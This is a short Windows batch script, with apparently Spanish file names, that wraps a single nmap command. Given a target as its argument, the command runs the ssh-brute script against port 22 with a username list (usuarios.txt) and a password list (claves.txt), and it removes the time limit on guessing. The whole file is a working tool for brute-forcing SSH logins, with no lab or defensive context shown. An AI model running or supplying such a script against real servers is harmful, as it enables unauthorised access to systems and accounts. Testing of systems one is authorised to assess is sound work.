@echo off
echo " "
nmap %1 -Pn -sT -p 22 --script ssh-brute --script-args userdb=usuarios.txt,passdb=claves.txt,unpwdb.timelimit=0
